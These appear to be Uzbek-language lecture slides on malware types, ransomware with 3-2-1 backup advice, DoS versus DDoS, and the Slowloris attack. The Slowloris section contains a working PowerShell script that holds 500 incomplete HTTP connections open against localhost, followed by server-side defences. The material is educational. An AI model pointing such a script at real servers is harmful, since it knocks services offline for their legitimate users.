01

Zararli dasturlar tasnifi

Malware turlari, maqsadlari va tarqalish yo'llari

Malware nima?

Malicious Software (Zararli dastur)

Foydalanuvchining ruxsatisiz tizimga kiruvchi, buzuvchi, o'g'irlovchi yoki kompyuter faoliyatini boshqaruvchi har qanday dasturiy vosita.

Maqsad: O'g'irlash

Parollar, bank kartalari, shaxsiy yozishmalar va sirlar.

Maqsad: Shifrlash

Fayllarni ochib bo'lmaydigan qilib, tovon puli talab qilish.

Maqsad: Nazorat

Kompyuterni zombi botnetiga qo'shib, DDoS hujumlarda ishlatish.

Virus vs Qurt (Worm)

Kompyuter Virusi

Mezbon faylga muhtoj

Boshqa dasturlar yoki fayllar (.exe, .docx) ichiga yashirinadi. Inson faylni ochgandagina ishga tushadi va ko'payadi.

Kompyuter Qurti (Worm)

Mustaqil dastur

Hech qanday mezbon faylga muhtoj emas. Tarmoqdagi zaifliklar orqali odam ishtirokisiz avtomatik tarzda tarqaladi.

Troyan otlari va Spyware

Troyan oti (Trojan Horse)

Foydali ko'rinishdagi niqob

O'yin, tekin aktivator yoki tozalovchi dastur qiyofasida yuklanadi. Ichida yashirin zararli modul (masalan, backdoor) bo'ladi.

Josus dastur (Spyware)

Yashirin kuzatuvchi

Klaviaturada terilgan parollarni (Keylogger), brauzer tarixini va veb-kamera tasvirlarini yozib olib buzg'unchiga jo'natadi.

Rootkit, Backdoor va Mantiqiy bombalar

Rootkit

Operatsion tizim yadrosiga (Kernel) o'rnashadi. O'zining fayllari va jarayonlarini antiviruslardan yashiradi.

Backdoor

Tizimga loginsiz, yashirin eshik orqali kirish imkonini yaratadi. Masofadan buyruq bajarish imkonini beradi.

Logic Bomb

Muayyan shart (sana yoki hodisa) sodir bo'lguncha yashirinib yotadi va vaqti kelganda tizimni o'chiradi.

02

Ransomware: Tovlamachi viruslar

Fayllarni shifrlash va tovon puli talab qilish sxemasi

Ransomware qanday ishlaydi?

1. Kirib kelish: Fishing xati, ochiq RDP porti yoki zararlangan fayl orqali kompyuterga kiradi.
2. Shifrlash (AES-256): Diskdagi barcha .docx, .pdf, .jpg, .sql fayllarini soniyalar ichida shifrlaydi.
3. Tovon talab qilish: Ekranda xabar paydo bo'ladi: «Fayllarni ochish uchun 0.5 Bitcoin to'lang!»

Ransomware ga qarshi oltin qoida

3-2-1 Zaxiralash qoidasi (Backup)

Fayllarning zaxira nusxasi bo'lsa, ransomware hech qanday zarar yetkaza olmaydi!

3 ta nusxa

Asosiy fayllarning kamida 3 ta nusxasi saqlanishi kerak.

2 xil tashuvchi

2 xil qurilmada (masalan, ichki disk va tashqi qattiq disk).

1 ta tashqi ombor

1 ta nusxa tarmoqdan uzilgan xavfsiz joyda yoki bulutda saqlanishi shart.

03

DoS va DDoS hujumlari

Foydalanuvchanlikni yo'q qilish mexanizmlari

DoS vs DDoS: Arxitektura

DoS (Denial of Service)

Bitta hujumchi kompyuter maqsadli serverga ko'p so'rov yuboradi. Bitta IP ni bloklash orqali to'xtatish oson.

DDoS (Distributed DoS)

Dunyo bo'ylab tarqalgan millionlab botnet qurilmalari bir vaqtda hujum qiladi. Barcha IP larni bloklash imkonsiz.

04

Slowloris hujumi

Past tezlikli HTTP DoS hujumining ishlash siri

Slowloris: Sekin va xavfli

Odatdagi DoS gigabaytlab paket yuboradi. Slowloris esa sekundiga bir necha bayt yuboradi!

1. HTTP GET so'rovi: Hujumchi so'rovni ochadi, lekin uni yakunlovchi bo'sh qatorni (`\r\n\r\n`) jo'natmaydi.
2. Kutish rejimida ushlash: Server so'rov tugashini kutadi. Hujumchi har 10 soniyada soxta sarlavha tashlab turadi.
3. Soketlar to'lishi: Serverning barcha ulanish o'rinlari (connection pool) to'ladi va yangi mijozlar kira olmaydi.

Amaliyot: Slowloris simulyatsiyasi

1..500 | ForEach-Object {
    Start-Job -ScriptBlock {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect("127.0.0.1", 80)
            $stream = $tcp.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.WriteLine("GET / HTTP/1.1`r`nHost: localhost`r`n")
            $writer.Flush()
            Start-Sleep -Seconds 300
        } catch {}
    }
}
Write-Host "500 ta sekin ulanish ochildi!"

Slowloris dan qanday himoyalanamiz?

Timeout ni kamaytirish

Sarlavhalarni kutish vaqtini (timeout) 5-10 soniyaga tushirish.

Ulanishlar limitini qo'yish

Bitta IP manzildan parallel ochiladigan ulanishlar sonini cheklash.

Reverse Proxy (Nginx)

Asinxron arxitekturaga ega Nginx ni oraliq server sifatida o'rnatish.
